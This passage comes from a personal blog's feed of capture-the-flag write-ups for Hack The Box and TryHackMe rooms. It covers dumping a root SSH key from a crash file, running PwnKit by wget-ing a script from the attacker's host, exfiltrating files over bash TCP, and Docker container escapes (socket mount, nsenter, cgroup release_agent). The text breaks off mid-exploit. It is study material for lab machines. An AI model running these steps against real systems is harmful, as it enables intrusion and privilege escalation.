+  &lt;li&gt;Investigate /opt/
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  dasith@secret:/tmp$ ls -la /opt
+  total 56
+  drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
+  drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
+  -rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
+  -rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
+  -rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
+  -rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;valgrind.log&lt;/code&gt; contains memory dump information
+        &lt;ul&gt;
+          &lt;li&gt;This indicates that CoreDump is enabled&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code.c&lt;/code&gt; is the source code for count (I think…my C is &lt;em&gt;really&lt;/em&gt; rusty)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/count&lt;/code&gt; to count the lines for /root/.ssh/id_rsa
+    &lt;ul&gt;
+      &lt;li&gt;When it asks you to save it to a file, hit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + z&lt;/code&gt; to put it in the background&lt;/li&gt;
+      &lt;li&gt;List running processes with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Kill the count process
+  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kill -SIGSEGV &amp;lt;PID&amp;gt;&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Bring your session to the foreground with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fg&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Program will crash and memory will be dumped.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Travel to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/crash&lt;/code&gt; and look for the file with the owner set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dasith&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Use apport-unpack to decompress the file to a directory in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Travel to your unpacked crash directory and view CoreDump
+  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;less CoreDump&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;It will warn you it’s a binary. Select Y to view it anyway.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Scroll until you see BEGIN RSA KEY in plain text&lt;/li&gt;
+  &lt;li&gt;Copy this key to your attacking machine and save it&lt;/li&gt;
+  &lt;li&gt;Use this file to SSH as root
+  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -i id_rsa root@10.10.11.120&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;12-root-flag&quot;&gt;12. Root Flag&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  cat root.txt
+  a##############################8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;VICTORY!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;13-gaining-root-path-2---pwnkit&quot;&gt;13. Gaining Root (Path 2 - PwnKit)&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;This is the easy way…&lt;/li&gt;
+  &lt;li&gt;It exploits a vulnerability in policykit (CVE-2021-4034)&lt;/li&gt;
+  &lt;li&gt;As &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dasith&lt;/code&gt; user, navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;In the directory that your PwnKit script is in, start an HTTP server with Python
+  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server 80&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;On victim machine, pull the script down, chmod it to be executable, and run it
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  wget &amp;lt;your ip&amp;gt;/PwnKit
+  chmod +x PwnKit
+  ./PwnKit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;TADA! You are root!&lt;/li&gt;
+  &lt;li&gt;Proceed to cat /root/root.txt for the root flag.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="HTB" /><category term="CTF" /><category term="JWT" /><summary type="html">Can you keep a secret?</summary></entry><entry><title type="html">TryHackMe - tomghost</title><link href="http://localhost:4000/THM-tomghost/" rel="alternate" type="text/html" title="TryHackMe - tomghost" /><published>2022-03-14T00:00:00-04:00</published><updated>2022-03-14T00:00:00-04:00</updated><id>http://localhost:4000/THM-tomghost</id><content type="html" xml:base="http://localhost:4000/THM-tomghost/">&lt;p&gt;&lt;em&gt;Free Room&lt;/em&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;AcousticGirl 
+March 14th, 2022&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;IP = 10.10.118.36&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Enumeration
+    &lt;ul&gt;
+      &lt;li&gt;Rustscan w/ nmap
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+ | ssh-hostkey: 
+ |   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
+ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
+ |   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
+ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
+ |   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
+ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
+ 53/tcp   open  tcpwrapped syn-ack
+ 8009/tcp open  ajp13      syn-ack Apache Jserv (Protocol v1.3)
+ | ajp-methods: 
+ |_  Supported methods: GET HEAD POST OPTIONS
+ 8080/tcp open  http       syn-ack Apache Tomcat 9.0.30
+ |_http-title: Apache Tomcat/9.0.30
+ | http-methods: 
+ |_  Supported Methods: GET HEAD POST OPTIONS
+ |_http-favicon: Apache Tomcat
+ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+        &lt;p&gt;Services of Note:
+SSH
+DNS?
+Apache Jserv
+Apache Tomcat 9.0.30&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Web Site
+    &lt;ul&gt;
+      &lt;li&gt;Standard Tomcat installation page, no robots.txt or subdirectories.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Metasploit
+    &lt;ul&gt;
+      &lt;li&gt;searched for jserv and it returned 1 module. Ran the module and obtained credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;skyfuck:8###################s&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;SSH
+    &lt;ul&gt;
+      &lt;li&gt;SSH’d in using credentials found in Step 3.&lt;/li&gt;
+      &lt;li&gt;Obtained User flag in /home/merlin/user.txt - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;THM{G#################y}&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Exfiltrated credential.pgp and tryhackme.asc via bash TCP connection to use&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;PGP Key (part 1)
+    &lt;ul&gt;
+      &lt;li&gt;Tried to import tryhackme.asc but it required a password.&lt;/li&gt;
+      &lt;li&gt;Previously discovered credentials did not work.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;John The Ripper
+    &lt;ul&gt;
+      &lt;li&gt;Updated John&lt;/li&gt;
+      &lt;li&gt;Used gpg2john on tryhackme.asc for password&lt;/li&gt;
+    &lt;/ul&gt;
+    &lt;ul&gt;
+      &lt;li&gt;password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a#######u&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;PGP Key (part 2)
+    &lt;ul&gt;
+      &lt;li&gt;Imported PGP key with password found in step 6&lt;/li&gt;
+      &lt;li&gt;decoded credential.pgp with key/password from step 5-6&lt;/li&gt;
+    &lt;/ul&gt;
+    &lt;ul&gt;
+      &lt;li&gt;obtained merlin’s credentials
+ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;merlin:a########################################################j&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Priv Esc / SSH (part 2)
+    &lt;ul&gt;
+      &lt;li&gt;Logged in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;merlin&lt;/code&gt; user with password recovered in step 7&lt;/li&gt;
+      &lt;li&gt;Ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; to ascertain if merlin has sudo privs and he does!
+ ```
+ merlin@ubuntu:~$ sudo -l
+ Matching Defaults entries for merlin on ubuntu:
+   env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&lt;/li&gt;
+    &lt;/ul&gt;
+
+    &lt;p&gt;User merlin may run the following commands on ubuntu:
+     (root : root) NOPASSWD: /usr/bin/zip
+ ```
+       - Merlin can sudo the zip program with no password
+       - Looked at Zip in GTFOBins and see Sudo listed
+       - Tried Zip Sudo exploit and got root&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Root Flag
+    &lt;ul&gt;
+      &lt;li&gt;obtained root flag in /root/root.txt
+ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;THM{Z#########E}&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;</content><author><name></name></author><category term="THM" /><category term="CTF" /><category term="Tomcat" /><summary type="html">Free Room</summary></entry><entry><title type="html">Mission Picker v1 Released!</title><link href="http://localhost:4000/MissionPicker/" rel="alternate" type="text/html" title="Mission Picker v1 Released!" /><published>2022-03-01T00:00:00-05:00</published><updated>2022-03-01T00:00:00-05:00</updated><id>http://localhost:4000/MissionPicker</id><content type="html" xml:base="http://localhost:4000/MissionPicker/">&lt;p&gt;Mission Picker v1 is here!&lt;/p&gt;
+
+&lt;p&gt;Do you struggle with an abundance of missions to choose from? Do you have trouble choosing? Let my new python script help you! Just type the mission names into the script and follow the instructions to have it pick your next mission for you.&lt;/p&gt;
+
+&lt;p&gt;I created this script to help with choosing between side missions in an RPG.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/jbreeves/MissionPicker&quot;&gt;Get it here&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="Python" /><summary type="html">Mission Picker v1 is here!</summary></entry><entry><title type="html">First Post!</title><link href="http://localhost:4000/Hello-World/" rel="alternate" type="text/html" title="First Post!" /><published>2022-02-28T00:00:00-05:00</published><updated>2022-02-28T00:00:00-05:00</updated><id>http://localhost:4000/Hello-World</id><content type="html" xml:base="http://localhost:4000/Hello-World/">&lt;p&gt;This is my first post on my github.io page.&lt;/p&gt;
+
+&lt;p&gt;I plan on using this page to document various CTFs and projects that I am working on.&lt;/p&gt;</content><author><name></name></author><summary type="html">This is my first post on my github.io page.</summary></entry><entry><title type="html">TryHackMe - Docker Rodeo</title><link href="http://localhost:4000/THM-Docker-Rodeo/" rel="alternate" type="text/html" title="TryHackMe - Docker Rodeo" /><published>2022-02-28T00:00:00-05:00</published><updated>2022-02-28T00:00:00-05:00</updated><id>http://localhost:4000/THM-Docker-Rodeo</id><content type="html" xml:base="http://localhost:4000/THM-Docker-Rodeo/">&lt;p&gt;&lt;em&gt;Subscriber Room&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;This is a room about common docker vulnerabities and their exploitations.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Added target IP to /etc/hosts as docker-rodeo.thm&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;task-1---deploying-the-machine&quot;&gt;Task 1 - Deploying the machine&lt;/h2&gt;
+&lt;p&gt;Started the machine.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-2---understanding-container-basics&quot;&gt;Task 2 - Understanding Container Basics&lt;/h2&gt;
+&lt;p&gt;Containers do not run on a hypervisor.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-3---abusing-a-docker-registry&quot;&gt;Task 3 - Abusing a Docker Registry&lt;/h2&gt;
+&lt;p&gt;This was a divider and not a real section.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-4---what-is-a-docker-registry&quot;&gt;Task 4 - What is a Docker Registry?&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Docker Registries are used to store and provide published Docker images for use&lt;/li&gt;
+  &lt;li&gt;One can switch between multiple versions of their applications and share them with other people with ease&lt;/li&gt;
+  &lt;li&gt;For a Docker repository to pull specific versions, the repository must store the data about every tag&lt;/li&gt;
+  &lt;li&gt;Docker images are essentially just instruction manuals so they can be reversed to understand what commands took place when the image was being built – in groups called layers.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;task-5---interacting-with-a-docker-registry&quot;&gt;Task 5 - Interacting with a Docker Registry&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Enumerate the services running to understand any potential entry points&lt;/li&gt;
+  &lt;li&gt;When scanning with Nmap, take note of the API version for the Docker Registry&lt;/li&gt;
+  &lt;li&gt;The Docker Registry is a JSON endpoint&lt;/li&gt;
+  &lt;li&gt;Using a dedicated program such as Postman or Insomnia will make it easier to query the endpoint versus using a terminal or browser&lt;/li&gt;
+  &lt;li&gt;Read the Docker Registry Documentation to discover what routes are available&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Discovering Repositories&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Sending a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://_hostmachine_:5000/v2/_catalog&lt;/code&gt; will list all the repositories in the registry&lt;/li&gt;
+  &lt;li&gt;Information types needed&lt;/li&gt;
+  &lt;li&gt;Repository Name&lt;/li&gt;
+  &lt;li&gt;Published Repository Tags “(if any)”
+    &lt;ul&gt;
+      &lt;li&gt;Every repository will have at least one tag&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Sending a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://_hostmachine_:5000/v2/_repository_/_name_/tags/list&lt;/code&gt; will show all published tags&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Grabbing the Data&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Using the repository name and tag name, you can enumerate the specific repository for the manifest file&lt;/li&gt;
+  &lt;li&gt;Sending a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://_hostmachine_:5000/v2/_repository_/_name_/mainfests/_tagname_&lt;/code&gt; will get the manifest for the tag specified&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Questions&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;What is the port number of the 2nd Docker registry?
+ 7000&lt;/li&gt;
+  &lt;li&gt;What is the name of the repository within this registry?
+ securesolutions/webserver&lt;/li&gt;
+  &lt;li&gt;What is the name of the tag that has been published? 
+ production&lt;/li&gt;
+  &lt;li&gt;What is the Username in the database configuration?
+ admin&lt;/li&gt;
+  &lt;li&gt;What is the Password in the database configuration?
+ production_admin&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;task-6---reverse-engineering-docker-images&quot;&gt;Task 6 - Reverse Engineering Docker Images&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;What is the “IMAGE_ID” for the “challenge” Docker image that you just downloaded?
+ 2a0a63ea5d88&lt;/li&gt;
+  &lt;li&gt;Using Dive, how many “Layers” are there in this image?
+ 7&lt;/li&gt;
+  &lt;li&gt;What user is successfully added?
+ uogctf&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;task-7---uploading-malicious-docker-images&quot;&gt;Task 7 - Uploading Malicious Docker Images&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;If a repository is vulnerable, we can upload (or push) our own images to a repository, containing malicious code
+    &lt;ul&gt;
+      &lt;li&gt;This can allow us to build commands into the container such as a netcat shell&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;No task questions.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-8---rce-via-exposed-docker-daemon&quot;&gt;Task 8 - RCE via Exposed Docker Daemon&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Unix filesystem sockets are faster than TCP/IP sockets but only interacts with the host itself&lt;/li&gt;
+  &lt;li&gt;Must be a part of the docker group to use the docker command&lt;/li&gt;
+  &lt;li&gt;Portainer or Jenkins are applications that allow docker commands to be executed remotely
+    &lt;ul&gt;
+      &lt;li&gt;To do this, a TCP/IP socket must be used&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Practical Section:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Enumerate your host thoroughly&lt;/li&gt;
+  &lt;li&gt;By default, the engine runs on port 2375&lt;/li&gt;
+  &lt;li&gt;Confirm vulnerability&lt;/li&gt;
+  &lt;li&gt;If port 2375 is open, use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; to interact with the exposed Docker daemon
+    &lt;ul&gt;
+      &lt;li&gt;Interacting with the daemon will give you system information&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Execution&lt;/li&gt;
+  &lt;li&gt;perform first command using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-H&lt;/code&gt; switch to specify to the Instance to list running containers&lt;/li&gt;
+  &lt;li&gt;Experimentation&lt;/li&gt;
+  &lt;li&gt;Possible actions:
+    &lt;ul&gt;
+      &lt;li&gt;list containers&lt;/li&gt;
+      &lt;li&gt;create your own container&lt;/li&gt;
+      &lt;li&gt;extract the filesystem to view data&lt;/li&gt;
+      &lt;li&gt;execute commands on host&lt;/li&gt;
+      &lt;li&gt;run a container&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use rootplease tool to create a root shell on the device itself&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;No task questions.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-9---escape-via-exposed-docker-daemon&quot;&gt;Task 9 - Escape via Exposed Docker Daemon&lt;/h2&gt;
+&lt;p&gt;Assumption: foothold has been gained on the container&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la | grep sock&lt;/code&gt; to find exposed Docker sockets once you have access to the machine “(via shell or ssh)”&lt;/li&gt;
+  &lt;li&gt;Verify if current user can run docker commands with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groups&lt;/code&gt; command&lt;/li&gt;
+  &lt;li&gt;Upload alpine image to container you’re exploiting&lt;/li&gt;
+  &lt;li&gt;Mount the host directory to a new container with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;This reveals all data on the host OS&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Verify who you’re logged in as and enumerate the file system for loot&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;No task questions.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-10---shared-namespaces&quot;&gt;Task 10 - Shared Namespaces&lt;/h2&gt;
+&lt;p&gt;Basics&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Containers have their own networking and file storage&lt;/li&gt;
+  &lt;li&gt;This is achieved with these components of the linux kernel
+    &lt;ul&gt;
+      &lt;li&gt;Namespaces&lt;/li&gt;
+      &lt;li&gt;Cgroups&lt;/li&gt;
+      &lt;li&gt;OverlayFS&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Namespaces segregate system resources such as processes, files, and memory&lt;/li&gt;
+  &lt;li&gt;Every linux process has a Namespace and a Process Identifier “(PID)”&lt;/li&gt;
+  &lt;li&gt;You can see the docker process when you run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps aux&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;When you run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps aux&lt;/code&gt; in a container there are significantly fewer processes running&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Why it matters&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Notable Processes&lt;/li&gt;
+  &lt;li&gt;PID 0 - process started at boot&lt;/li&gt;
+  &lt;li&gt;PID 1 - processes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init&lt;/code&gt;, example: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;You can use process 1 on the host OS to escalate privileges&lt;/li&gt;
+  &lt;li&gt;Happens when PIDs overlap between containers and host OSes&lt;/li&gt;
+  &lt;li&gt;Vulnerability generally relies on having root on the container&lt;/li&gt;
+  &lt;li&gt;Exploit&lt;/li&gt;
+  &lt;li&gt;Use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsenter&lt;/code&gt; command
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsenter --target 1 --mount sh&lt;/code&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--target&lt;/code&gt; with a value of 1 will execute a shell command we later provide to execute in the namespace of the special system process ID, to get ultimate root&lt;/li&gt;
+          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--mount&lt;/code&gt; is where we provide the namespace we are targetting&lt;/li&gt;
+          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh&lt;/code&gt; is the command that will be executed in the privileged namespace “(therefore with the namespace’s privileges)”&lt;/li&gt;
+          &lt;li&gt;You may need to “Ctrl + C” to cancel the exploit once or twice for this vulnerability to work&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;task-11---miconfigured-privileges&quot;&gt;Task 11 - Miconfigured Privileges&lt;/h2&gt;
+&lt;p&gt;Understanding Capabilities&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Docker can run in two modes&lt;/li&gt;
+  &lt;li&gt;User Mode&lt;/li&gt;
+  &lt;li&gt;Privileged Mode&lt;/li&gt;
+  &lt;li&gt;Containers running in User Mode interact with the host OS through the Docker engine&lt;/li&gt;
+  &lt;li&gt;Containers running in Privileged Mode bypass the Docker engine and have direct communication with the host OS&lt;/li&gt;
+  &lt;li&gt;If a container is running in Privileged Mode:&lt;/li&gt;
+  &lt;li&gt;Can run commands as the root user “(on the OS)”&lt;/li&gt;
+  &lt;li&gt;We can use a system package such as “libcap2-bin”’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capsh&lt;/code&gt; to list the capabilities our container has: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capsh --print&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capsh --print | grep&lt;/code&gt; can help you zero in on different capabilities&lt;/li&gt;
+  &lt;li&gt;Interesting capabilities:
+    &lt;ul&gt;
+      &lt;li&gt;cap_net_admin&lt;/li&gt;
+      &lt;li&gt;cap_sys_module&lt;/li&gt;
+      &lt;li&gt;cap_sys_admin&lt;/li&gt;
+      &lt;li&gt;cap_sys_chroot&lt;/li&gt;
+      &lt;li&gt;cap_sys_time&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so&quot;&gt;Proof of Concept&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;What’s happening during exploitation:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir /tmp/cgrp &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;amp;&amp;amp; mkdir /tmp/cgrp/x&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;creates a group to use the Linux kernel to write and execute our exploit&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo 1 &amp;gt; /tmp/cgrp/x/notify_on_release&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;telling the kernel to execute something once the “cgroup” finishes&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;find out where the containers files are stored on the host and store it as a variable&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;$host_path/exploit&quot; &amp;gt; /tmp/cgrp/release_agent&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;echo the location of the containers files into our “/exploit” and then ultimately to the “release_agent” which is what will be executed by the “cgroup” once it is released&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo '#!/bin/sh' &amp;gt; /exploit&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;turn the exploit into a shell on the host&lt;/li&gt;
